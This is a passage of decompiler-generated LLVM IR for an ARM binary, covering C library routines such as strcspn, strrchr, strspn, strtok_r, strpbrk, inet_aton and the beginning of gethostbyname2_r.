  br i1 %v9_1449c, label %dec_label_pc_144e0, label %dec_label_pc_144a8

dec_label_pc_144a8:                               ; preds = %dec_label_pc_14498
  %v2_144a8 = icmp eq i8 %v3_14498, 0
  br i1 %v2_144a8, label %dec_label_pc_144e0, label %dec_label_pc_144b0

dec_label_pc_144b0:                               ; preds = %dec_label_pc_144a8
  %v1_144b0 = add i32 %v0_144a0, 2
  %v2_144b0 = inttoptr i32 %v1_144b0 to i8*
  %v3_144b0 = load i8, i8* %v2_144b0, align 1
  %v4_144b0 = zext i8 %v3_144b0 to i32
  %v9_144b4 = icmp eq i32 %v4_144b0, %v1_14408
  br i1 %v9_144b4, label %dec_label_pc_144e0, label %dec_label_pc_144c0

dec_label_pc_144c0:                               ; preds = %dec_label_pc_144b0
  %v2_144c0 = icmp eq i8 %v3_144b0, 0
  br i1 %v2_144c0, label %dec_label_pc_144e0, label %dec_label_pc_144c8

dec_label_pc_144c8:                               ; preds = %dec_label_pc_144c0
  %v1_144c8 = add i32 %v0_144a0, 3
  %v2_144c8 = inttoptr i32 %v1_144c8 to i8*
  %v3_144c8 = load i8, i8* %v2_144c8, align 1
  %v4_144c8 = zext i8 %v3_144c8 to i32
  %v9_144cc = icmp eq i32 %v4_144c8, %v1_14408
  br i1 %v9_144cc, label %dec_label_pc_144e0, label %dec_label_pc_144d8

dec_label_pc_144d8:                               ; preds = %dec_label_pc_144c8
  %v2_144d8 = icmp eq i8 %v3_144c8, 0
  br i1 %v2_144d8, label %dec_label_pc_144e0, label %dec_label_pc_1443c

dec_label_pc_144e0:                               ; preds = %dec_label_pc_1441c, %dec_label_pc_14410, %dec_label_pc_144d8, %dec_label_pc_144c8, %dec_label_pc_144c0, %dec_label_pc_144b0, %dec_label_pc_144a8, %dec_label_pc_14498, %dec_label_pc_14490, %dec_label_pc_14480
  %v1_144e4 = phi i32 [ %v1_144c8, %dec_label_pc_144d8 ], [ %v1_144c8, %dec_label_pc_144c8 ], [ %v1_144b0, %dec_label_pc_144c0 ], [ %v1_144b0, %dec_label_pc_144b0 ], [ %v1_14498, %dec_label_pc_144a8 ], [ %v1_14498, %dec_label_pc_14498 ], [ %v0_144a0, %dec_label_pc_14490 ], [ %v0_144a0, %dec_label_pc_14480 ], [ %v0_14424, %dec_label_pc_14410 ], [ %v0_14424, %dec_label_pc_1441c ]
  ret i32 %v1_144e4

; uselistorder directives
  uselistorder i32 %v4_1443c, { 1, 0 }
  uselistorder i32 %v2_1443c, { 0, 2, 1 }
  uselistorder i32 %v0_144a0, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_14430, { 1, 0 }
  uselistorder i32 %v1_14424, { 1, 0, 2 }
  uselistorder i32 %v0_144282, { 2, 1, 0 }
  uselistorder i32 %v1_14408, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_144e0, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_14480, { 1, 0 }
  uselistorder label %dec_label_pc_14410, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_144f0 = load i32, i32* @r4, align 4
  store i32 %v3_144f0, i32* %stack_var_-16, align 4
  %v6_144f0 = load i32, i32* @r5, align 4
  %v9_144f0 = load i32, i32* @r6, align 4
  %v0_144f4 = load i32, i32* @r0, align 4
  %v0_144f8 = load i32, i32* @r1, align 4
  store i32 %v0_144f8, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_145148 = inttoptr i32 %v0_144f4 to i8*
  %v2_145149 = load i8, i8* %v1_145148, align 1
  %v3_1451410 = zext i8 %v2_145149 to i32
  store i32 %v3_1451410, i32* @r1, align 4
  %v2_1451811 = icmp eq i8 %v2_145149, 0
  store i32 %v0_144f8, i32* @r0, align 4
  %v1_1452012 = add i32 %v0_144f4, 1
  store i32 %v1_1452012, i32* @r4, align 4
  br i1 %v2_1451811, label %dec_label_pc_14528, label %dec_label_pc_14504

dec_label_pc_14504:                               ; preds = %entry, %dec_label_pc_14510
  %v3_1451414 = phi i32 [ %v3_14514, %dec_label_pc_14510 ], [ %v3_1451410, %entry ]
  %v0_1451c13 = phi i32 [ %v0_1451c.pre, %dec_label_pc_14510 ], [ %v0_144f8, %entry ]
  %v2_14504 = call i32 @__GI_strchr(i32 %v0_1451c13, i32 %v3_1451414)
  %v2_14508 = icmp eq i32 %v2_14504, 0
  %v0_14510 = load i32, i32* @r5, align 4
  br i1 %v2_14508, label %dec_label_pc_14510, label %dec_label_pc_14528

dec_label_pc_14510:                               ; preds = %dec_label_pc_14504
  %v1_14510 = add i32 %v0_14510, 1
  %v0_14514.pre = load i32, i32* @r4, align 4
  %v0_1451c.pre = load i32, i32* @r6, align 4
  store i32 %v1_14510, i32* @r5, align 4
  %v1_14514 = inttoptr i32 %v0_14514.pre to i8*
  %v2_14514 = load i8, i8* %v1_14514, align 1
  %v3_14514 = zext i8 %v2_14514 to i32
  store i32 %v3_14514, i32* @r1, align 4
  %v2_14518 = icmp eq i8 %v2_14514, 0
  store i32 %v0_1451c.pre, i32* @r0, align 4
  %v1_14520 = add i32 %v0_14514.pre, 1
  store i32 %v1_14520, i32* @r4, align 4
  br i1 %v2_14518, label %dec_label_pc_14528, label %dec_label_pc_14504

dec_label_pc_14528:                               ; preds = %dec_label_pc_14510, %dec_label_pc_14504, %entry
  %v0_14528 = phi i32 [ 0, %entry ], [ %v0_14510, %dec_label_pc_14504 ], [ %v1_14510, %dec_label_pc_14510 ]
  %v2_1452c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1452c, i32* @r4, align 4
  store i32 %v6_144f0, i32* @r5, align 4
  store i32 %v9_144f0, i32* @r6, align 4
  ret i32 %v0_14528

; uselistorder directives
  uselistorder i32 %v3_14514, { 1, 0 }
  uselistorder i32 %v0_1451c.pre, { 1, 0 }
  uselistorder i32 %v0_14514.pre, { 1, 0 }
  uselistorder label %dec_label_pc_14504, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_14538 = urem i32 %arg2, 256
  store i32 %v1_14538, i32* @r4, align 4
  %v2_14538 = icmp eq i32 %v1_14538, 0
  br i1 %v2_14538, label %dec_label_pc_1454c, label %dec_label_pc_14560.preheader

dec_label_pc_14560.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_145683 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_14538)
  %v2_1456c5 = icmp eq i32 %v2_145683, 0
  br i1 %v2_1456c5, label %dec_label_pc_14574, label %dec_label_pc_14558

dec_label_pc_1454c:                               ; preds = %entry
  %v2_14550 = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_14578

dec_label_pc_14558:                               ; preds = %dec_label_pc_14560.preheader, %dec_label_pc_14558
  %v2_145686 = phi i32 [ %v2_14568, %dec_label_pc_14558 ], [ %v2_145683, %dec_label_pc_14560.preheader ]
  store i32 %v2_145686, i32* @r5, align 4
  %v1_1455c = add i32 %v2_145686, 1
  store i32 %v1_1455c, i32* @r0, align 4
  %v0_14564 = load i32, i32* @r4, align 4
  %v2_14568 = call i32 @__GI_strchr(i32 %v1_1455c, i32 %v0_14564)
  %v2_1456c = icmp eq i32 %v2_14568, 0
  br i1 %v2_1456c, label %dec_label_pc_14574, label %dec_label_pc_14558

dec_label_pc_14574:                               ; preds = %dec_label_pc_14558, %dec_label_pc_14560.preheader
  %v0_14574 = load i32, i32* @r5, align 4
  br label %dec_label_pc_14578

dec_label_pc_14578:                               ; preds = %dec_label_pc_1454c, %dec_label_pc_14574
  %storemerge = phi i32 [ %v2_14550, %dec_label_pc_1454c ], [ %v0_14574, %dec_label_pc_14574 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_14568, { 1, 0 }
  uselistorder i32 %v1_1455c, { 1, 0 }
  uselistorder i32 %v1_14538, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_14578, { 1, 0 }
  uselistorder label %dec_label_pc_14558, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_145b42 = load i32, i32* @r0, align 4
  %v1_145b43 = inttoptr i32 %v0_145b42 to i8*
  %v2_145b44 = load i8, i8* %v1_145b43, align 1
  %v3_145b45 = zext i8 %v2_145b44 to i32
  store i32 %v3_145b45, i32* @ip, align 4
  %v2_145b86 = icmp eq i8 %v2_145b44, 0
  br i1 %v2_145b86, label %dec_label_pc_145c4, label %dec_label_pc_14598.preheader

dec_label_pc_14590:                               ; preds = %dec_label_pc_14598
  %v3_14598 = zext i8 %v2_14598 to i32
  %v1_145a0 = add i32 %v0_145a0, 1
  %v9_14590 = icmp eq i32 %v0_1459010, %v3_14598
  br i1 %v9_14590, label %dec_label_pc_145ac, label %dec_label_pc_14598

dec_label_pc_14598:                               ; preds = %dec_label_pc_14598.preheader, %dec_label_pc_14590
  %v0_145a0 = phi i32 [ %tmp, %dec_label_pc_14598.preheader ], [ %v1_145a0, %dec_label_pc_14590 ]
  %v1_14598 = inttoptr i32 %v0_145a0 to i8*
  %v2_14598 = load i8, i8* %v1_14598, align 1
  %v2_1459c = icmp eq i8 %v2_14598, 0
  br i1 %v2_1459c, label %dec_label_pc_145c4, label %dec_label_pc_14590

dec_label_pc_145ac:                               ; preds = %dec_label_pc_14590
  %v1_145ac = add i32 %v0_145ac, 1
  %v1_145b0 = add i32 %v0_145b0, 1
  %v1_145b4 = inttoptr i32 %v1_145b0 to i8*
  %v2_145b4 = load i8, i8* %v1_145b4, align 1
  %v3_145b4 = zext i8 %v2_145b4 to i32
  store i32 %v3_145b4, i32* @ip, align 4
  %v2_145b8 = icmp eq i8 %v2_145b4, 0
  br i1 %v2_145b8, label %dec_label_pc_145c4, label %dec_label_pc_14598.preheader

dec_label_pc_14598.preheader:                     ; preds = %entry, %dec_label_pc_145ac
  %v0_145b0 = phi i32 [ %v1_145b0, %dec_label_pc_145ac ], [ %v0_145b42, %entry ]
  %v0_145ac = phi i32 [ %v1_145ac, %dec_label_pc_145ac ], [ 0, %entry ]
  %v0_1459010 = phi i32 [ %v3_145b4, %dec_label_pc_145ac ], [ %v3_145b45, %entry ]
  br label %dec_label_pc_14598

dec_label_pc_145c4:                               ; preds = %dec_label_pc_145ac, %dec_label_pc_14598, %entry
  %v0_145c4 = phi i32 [ 0, %entry ], [ %v0_145ac, %dec_label_pc_14598 ], [ %v1_145ac, %dec_label_pc_145ac ]
  ret i32 %v0_145c4

; uselistorder directives
  uselistorder i32 %v0_145a0, { 1, 0 }
  uselistorder label %dec_label_pc_14598.preheader, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_145d0 = load i32, i32* @r4, align 4
  store i32 %v3_145d0, i32* %stack_var_-16, align 4
  %v0_145d4 = load i32, i32* @r0, align 4
  store i32 %v0_145d4, i32* %r4.global-to-local, align 4
  %v2_145d4 = icmp eq i32 %v0_145d4, 0
  %v1_145d8 = load i32, i32* @r2, align 4
  br i1 %v2_145d4, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_145d8 = inttoptr i32 %v1_145d8 to i32*
  %v3_145d8 = load i32, i32* %v2_145d8, align 4
  store i32 %v3_145d8, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_145dc = phi i32 [ %v3_145d8, %bb ], [ %v0_145d4, %entry ]
  store i32 %v0_145dc, i32* @r0, align 4
  store i32 %v1_145d8, i32* %r5.global-to-local, align 4
  %v0_145e4 = load i32, i32* @r1, align 4
  store i32 %v0_145e4, i32* %r6.global-to-local, align 4
  %v1_145e8 = inttoptr i32 %v0_145dc to i8*
  %v2_145e8 = call i32 @__GI_strspn(i8* %v1_145e8)
  %v0_145ec = load i32, i32* %r4.global-to-local, align 4
  %v2_145ec = add i32 %v0_145ec, %v2_145e8
  %v3_145ec = inttoptr i32 %v2_145ec to i8*
  %v4_145ec = load i8, i8* %v3_145ec, align 1
  %v6_145ec = zext i8 %v4_145ec to i32
  store i32 %v6_145ec, i32* %r3.global-to-local, align 4
  store i32 %v2_145ec, i32* @r4, align 4
  %v2_145f4 = icmp eq i8 %v4_145ec, 0
  br i1 %v2_145f4, label %bb8, label %dec_label_pc_14600

bb8:                                              ; preds = %entry._crit_edge
  %v2_145f8 = load i32, i32* %r5.global-to-local, align 4
  %v3_145f8 = inttoptr i32 %v2_145f8 to i32*
  store i32 %v2_145ec, i32* %v3_145f8, align 4
  br label %dec_label_pc_1463c

dec_label_pc_14600:                               ; preds = %entry._crit_edge
  %v0_14600 = load i32, i32* %r6.global-to-local, align 4
  %v3_14608 = call i32 @__GI_strpbrk(i8* %v3_145ec, i32 %v0_14600)
  %v3_1460c = icmp eq i32 %v3_14608, 0
  br i1 %v3_1460c, label %dec_label_pc_14614, label %dec_label_pc_1462c

dec_label_pc_14614:                               ; preds = %dec_label_pc_14600
  %v0_14618 = load i32, i32* @r4, align 4
  store i32 %v0_14618, i32* @r0, align 4
  %v2_1461c = call i32 @rawmemchr(i32 %v0_14618, i32 0)
  %v0_14620 = load i32, i32* @r4, align 4
  store i32 %v0_14620, i32* %r3.global-to-local, align 4
  %v1_14624 = load i32, i32* %r5.global-to-local, align 4
  %v2_14624 = inttoptr i32 %v1_14624 to i32*
  store i32 %v2_1461c, i32* %v2_14624, align 4
  br label %dec_label_pc_1463c

dec_label_pc_1462c:                               ; preds = %dec_label_pc_14600
  %v4_14608 = inttoptr i32 %v3_14608 to i8*
  store i8 0, i8* %v4_14608, align 1
  %v7_14630 = add i32 %v3_14608, 1
  %v1_14634 = load i32, i32* %r5.global-to-local, align 4
  %v2_14634 = inttoptr i32 %v1_14634 to i32*
  store i32 %v7_14630, i32* %v2_14634, align 4
  %v0_14638 = load i32, i32* @r4, align 4
  store i32 %v0_14638, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1463c

dec_label_pc_1463c:                               ; preds = %bb8, %dec_label_pc_14614, %dec_label_pc_1462c
  %v0_1463c = load i32, i32* %r3.global-to-local, align 4
  %v2_14640 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14640, i32* @r4, align 4
  ret i32 %v0_1463c

; uselistorder directives
  uselistorder i32 %v3_14608, { 0, 2, 1 }
  uselistorder i32 %v0_145dc, { 1, 0 }
  uselistorder i32 %v0_145d4, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1463c, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14674

dec_label_pc_14650:                               ; preds = %dec_label_pc_14660
  %v3_14660 = zext i8 %v2_14660 to i32
  %v1_14668 = add i32 %v0_14668, 1
  %v1_14650 = load i32, i32* %r0.global-to-local, align 4
  %v9_14650 = icmp eq i32 %v3_14660, %v1_14650
  br i1 %v9_14650, label %dec_label_pc_14658, label %dec_label_pc_14660

dec_label_pc_14658:                               ; preds = %dec_label_pc_14650
  %v0_14658 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_14658, i32* %r0.global-to-local, align 4
  ret i32 %v0_14658

dec_label_pc_14660:                               ; preds = %dec_label_pc_14650, %dec_label_pc_14674
  %v0_14668 = phi i32 [ %v1_14668, %dec_label_pc_14650 ], [ %arg2, %dec_label_pc_14674 ]
  %v1_14660 = inttoptr i32 %v0_14668 to i8*
  %v2_14660 = load i8, i8* %v1_14660, align 1
  %v2_14664 = icmp eq i8 %v2_14660, 0
  br i1 %v2_14664, label %dec_label_pc_14670, label %dec_label_pc_14650

dec_label_pc_14670:                               ; preds = %dec_label_pc_14660
  %v0_14670 = load i32, i32* %r2.global-to-local, align 4
  %v1_14670 = add i32 %v0_14670, 1
  br label %dec_label_pc_14674

dec_label_pc_14674:                               ; preds = %entry, %dec_label_pc_14670
  %storemerge = phi i32 [ %tmp, %entry ], [ %v1_14670, %dec_label_pc_14670 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_14674 = inttoptr i32 %storemerge to i8*
  %v2_14674 = load i8, i8* %v1_14674, align 1
  %v3_14674 = zext i8 %v2_14674 to i32
  store i32 %v3_14674, i32* %r0.global-to-local, align 4
  %v2_14678 = icmp eq i8 %v2_14674, 0
  %v0_1467c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_14678, i32 %v0_1467c)
  br label %dec_label_pc_14660

; uselistorder directives
  uselistorder i32 %v0_14668, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_14674, { 1, 0 }
  uselistorder label %dec_label_pc_14660, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_14688 = load i32, i32* @r4, align 4
  store i32 %v3_14688, i32* %stack_var_-28, align 4
  %v0_14690 = load i32, i32* %r0.global-to-local, align 4
  %v2_14690 = icmp eq i32 %v0_14690, 0
  br i1 %v2_14690, label %dec_label_pc_1476c, label %dec_label_pc_146a0

dec_label_pc_146a0:                               ; preds = %entry
  br label %dec_label_pc_146b8

dec_label_pc_146b8:                               ; preds = %dec_label_pc_146a0, %dec_label_pc_14730
  %v1_14730 = phi i32 [ 0, %dec_label_pc_146a0 ], [ %v5_14730, %dec_label_pc_14730 ]
  %v0_14734 = phi i32 [ 1, %dec_label_pc_146a0 ], [ %v1_14734, %dec_label_pc_14730 ]
  %v0_146b8 = phi i32 [ %v0_14690, %dec_label_pc_146a0 ], [ %v0_146b812, %dec_label_pc_14730 ]
  %v1_146b8 = inttoptr i32 %v0_146b8 to i8*
  %v2_146b8 = load i8, i8* %v1_146b8, align 1
  %v3_146b8 = zext i8 %v2_146b8 to i32
  %v4_146bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 1784) to i32*), align 4
  %v2_146c0 = mul nuw nsw i32 %v3_146b8, 2
  %v2_146c4 = add i32 %v2_146c0, %v4_146bc
  %v3_146c4 = inttoptr i32 %v2_146c4 to i16*
  %v4_146c4 = load i16, i16* %v3_146c4, align 2
  %v1_146c8 = and i16 %v4_146c4, 8
  %v2_146c8 = icmp eq i16 %v1_146c8, 0
  br i1 %v2_146c8, label %dec_label_pc_1476c, label %dec_label_pc_146d0

dec_label_pc_146d0:                               ; preds = %dec_label_pc_146b8
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_146f0

dec_label_pc_146d8:                               ; preds = %dec_label_pc_146f0
  %v2_146d8 = mul i32 %v0_14730, 10
  %v1_146dc = add i32 %v2_146d8, -48
  %v2_146e0 = add i32 %v3_146f0, %v1_146dc
  store i32 %v2_146e0, i32* @ip, align 4
  %v8_146e8 = icmp sgt i32 %v2_146e0, 255
  br i1 %v8_146e8, label %dec_label_pc_1476c, label %dec_label_pc_146ec

dec_label_pc_146ec:                               ; preds = %dec_label_pc_146d8
  %v1_146ec = add i32 %v0_14720, 1
  store i32 %v1_146ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_146f0

dec_label_pc_146f0:                               ; preds = %dec_label_pc_146d0, %dec_label_pc_146ec
  %v0_14730 = phi i32 [ 0, %dec_label_pc_146d0 ], [ %v2_146e0, %dec_label_pc_146ec ]
  %v0_14720 = phi i32 [ %v0_146b8, %dec_label_pc_146d0 ], [ %v1_146ec, %dec_label_pc_146ec ]
  %v1_146f0 = inttoptr i32 %v0_14720 to i8*
  %v2_146f0 = load i8, i8* %v1_146f0, align 1
  %v3_146f0 = zext i8 %v2_146f0 to i32
  %v2_146f4 = mul nuw nsw i32 %v3_146f0, 2
  %v2_146f8 = add i32 %v2_146f4, %v4_146bc
  %v3_146f8 = inttoptr i32 %v2_146f8 to i16*
  %v4_146f8 = load i16, i16* %v3_146f8, align 2
  %v6_146f8 = zext i16 %v4_146f8 to i32
  %v1_146fc = and i32 %v6_146f8, 8
  %v2_146fc = icmp eq i32 %v1_146fc, 0
  br i1 %v2_146fc, label %dec_label_pc_14704, label %dec_label_pc_146d8

dec_label_pc_14704:                               ; preds = %dec_label_pc_146f0
  %v7_14704 = icmp eq i32 %v0_14734, 4
  br i1 %v7_14704, label %dec_label_pc_1471c, label %dec_label_pc_1470c

dec_label_pc_1470c:                               ; preds = %dec_label_pc_14704
  %v7_1470c = icmp eq i8 %v2_146f0, 46
  br i1 %v7_1470c, label %dec_label_pc_14714, label %dec_label_pc_1476c

dec_label_pc_14714:                               ; preds = %dec_label_pc_1470c
  %v1_14714 = add i32 %v0_14720, 1
  store i32 %v1_14714, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14730

dec_label_pc_1471c:                               ; preds = %dec_label_pc_14704
  %v2_1471c = icmp eq i8 %v2_146f0, 0
  %v1_14720 = add i32 %v0_14720, 1
  store i32 %v1_14720, i32* %r0.global-to-local, align 4
  br i1 %v2_1471c, label %dec_label_pc_14730, label %dec_label_pc_14728

dec_label_pc_14728:                               ; preds = %dec_label_pc_1471c
  %v1_14728 = and i32 %v6_146f8, 32
  %v2_14728 = icmp eq i32 %v1_14728, 0
  br i1 %v2_14728, label %dec_label_pc_1476c, label %dec_label_pc_14730

dec_label_pc_14730:                               ; preds = %dec_label_pc_14728, %dec_label_pc_1471c, %dec_label_pc_14714
  %v0_146b812 = phi i32 [ %v1_14720, %dec_label_pc_14728 ], [ %v1_14720, %dec_label_pc_1471c ], [ %v1_14714, %dec_label_pc_14714 ]
  %v4_14730 = mul i32 %v1_14730, 256
  %v5_14730 = or i32 %v0_14730, %v4_14730
  %v1_14734 = add nuw nsw i32 %v0_14734, 1
  %v7_1473c = icmp slt i32 %v1_14734, 5
  br i1 %v7_1473c, label %dec_label_pc_146b8, label %dec_label_pc_14740

dec_label_pc_14740:                               ; preds = %dec_label_pc_14730
  %v2_14740 = icmp eq i32 %arg2, 0
  br i1 %v2_14740, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_14740
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14770

bb:                                               ; preds = %dec_label_pc_14740
  %v4_14744 = udiv i32 %v5_14730, 16777216
  %v2_14748 = udiv i32 %v5_14730, 256
  %v5_1474c = and i32 %v2_14748, 65280
  %v2_14750 = and i32 %v5_14730, 65280
  %v5_14754 = mul nuw nsw i32 %v2_14750, 256
  %v5_14758 = mul i32 %v0_14730, 16777216
  %v6_1474c = or i32 %v4_14744, %v5_14758
  %v6_14754 = or i32 %v6_1474c, %v5_1474c
  %v6_14758 = or i32 %v6_14754, %v5_14754
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_14764 = inttoptr i32 %arg2 to i32*
  store i32 %v6_14758, i32* %v3_14764, align 4
  %v2_14770.pre = load i32, i32* %stack_var_-28, align 4
  %v1_14774.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14770

dec_label_pc_1476c:                               ; preds = %dec_label_pc_1470c, %dec_label_pc_14728, %dec_label_pc_146b8, %dec_label_pc_146d8, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14770

dec_label_pc_14770:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_1476c
  %v1_14774 = phi i32 [ %v1_14774.pre, %bb ], [ 0, %dec_label_pc_1476c ], [ 1, %.thread7.thread ]
  %v2_14770 = phi i32 [ %v2_14770.pre, %bb ], [ %v3_14688, %dec_label_pc_1476c ], [ %v3_14688, %.thread7.thread ]
  store i32 %v2_14770, i32* @r4, align 4
  ret i32 %v1_14774

; uselistorder directives
  uselistorder i32 %v1_14734, { 1, 0 }
  uselistorder i32 %v5_14730, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14720, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 2, 3, 4, 6, 7, 8, 0, 1 }
  uselistorder i32 65280, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14770, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1476c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_146f0, { 1, 0 }
  uselistorder label %dec_label_pc_146b8, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp24, i32* %stack_var_0, align 4
  %v6_14780 = load i32, i32* @r5, align 4
  %v9_14780 = load i32, i32* @r6, align 4
  %v12_14780 = load i32, i32* @r7, align 4
  %v15_14780 = load i32, i32* @r8, align 4
  %v18_14780 = load i32, i32* @sb, align 4
  %v21_14780 = load i32, i32* @sl, align 4
  %v24_14780 = load i32, i32* @fp, align 4
  %v0_14784 = load i32, i32* @r1, align 4
  %v7_14784 = icmp eq i32 %v0_14784, 2
  store i32 %arg1, i32* @sb, align 4
  %v0_14790 = load i32, i32* @r2, align 4
  store i32 %v0_14790, i32* @r7, align 4
  %v0_14794 = load i32, i32* @r3, align 4
  store i32 %v0_14794, i32* @r8, align 4
  br i1 %v7_14784, label %dec_label_pc_147a0, label %dec_label_pc_147c0

dec_label_pc_147a0:                               ; preds = %entry
  store i32 %tmp12, i32* @ip, align 4
  store i32 %v0_14790, i32* @r1, align 4
  store i32 %v0_14794, i32* @r2, align 4
  store i32 %tmp24, i32* @r3, align 4
  %v0_147b8 = call i32 @gethostbyname_r()
  store i32 %v0_147b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a34

dec_label_pc_147c0:                               ; preds = %entry
  store i32 0, i32* @sl, align 4
  %v7_147c8 = icmp eq i32 %v0_14784, 10
  %v2_147cc = inttoptr i32 %tmp12 to i32*
  store i32 0, i32* %v2_147cc, align 4
  br i1 %v7_147c8, label %dec_label_pc_147d4, label %dec_label_pc_14a30

dec_label_pc_147d4:                               ; preds = %dec_label_pc_147c0
  %v1_147d4 = load i32, i32* @sl, align 4
  %v9_147d4 = icmp eq i32 %v1_147d4, %arg1
  br i1 %v9_147d4, label %dec_label_pc_14a30, label %dec_label_pc_147dc

dec_label_pc_147dc:                               ; preds = %dec_label_pc_147d4
  %v0_147e4 = call i32 @__aeabi_read_tp()
  store i32 %v0_147e4, i32* %r0.global-to-local, align 4
  %v3_147e8 = load i16, i16* @global_var_24070.401, align 2
  %v4_147e8 = sext i16 %v3_147e8 to i32
  store i32 %v4_147e8, i32* @r5, align 4
  store i32 %tmp12, i32* @lr, align 4
  %v2_147f8 = add i32 %v4_147e8, %v0_147e4
  %v3_147f8 = inttoptr i32 %v2_147f8 to i32*
  %v4_147f8 = load i32, i32* %v3_147f8, align 4
  store i32 %v4_147f8, i32* @r4, align 4
  store i32 %v0_147e4, i32* @r6, align 4
  %v0_14800 = load i32, i32* @sl, align 4
  store i32 %v0_14800, i32* %v3_147f8, align 4
  %v0_14804 = load i32, i32* @sb, align 4
  store i32 %v0_14804, i32* %r0.global-to-local, align 4
  %v1_14810 = call i32 @__get_hosts_byname_r(i32 %v0_14804)
  store i32 %v1_14810, i32* %r0.global-to-local, align 4
  %v2_14814 = icmp eq i32 %v1_14810, 0
  br i1 %v2_14814, label %.thread1, label %dec_label_pc_14828

.thread1:                                         ; preds = %dec_label_pc_147dc
  %v4_1481c = load i16, i16* @global_var_24070.401, align 2
  %v5_1481c = sext i16 %v4_1481c to i32
  store i32 %v5_1481c, i32* %r3.global-to-local, align 4
  %v1_14820 = load i32, i32* @r4, align 4
  %v2_14820 = load i32, i32* @r6, align 4
  %v4_14820 = add i32 %v2_14820, %v5_1481c
  %v5_14820 = inttoptr i32 %v4_14820 to i32*
  store i32 %v1_14820, i32* %v5_14820, align 4
  br label %dec_label_pc_14a34

dec_label_pc_14828:                               ; preds = %dec_label_pc_147dc
  %v0_14828 = load i32, i32* @fp, align 4
  %v1_14828 = inttoptr i32 %v0_14828 to i32*
  %v2_14828 = load i32, i32* %v1_14828, align 4
  store i32 %v2_14828, i32* %r3.global-to-local, align 4
  %v7_1482c = icmp eq i32 %v2_14828, 1
  br i1 %v7_1482c, label %dec_label_pc_14848, label %dec_label_pc_14834

dec_label_pc_14834:                               ; preds = %dec_label_pc_14828
  %v7_14834 = icmp eq i32 %v2_14828, 4
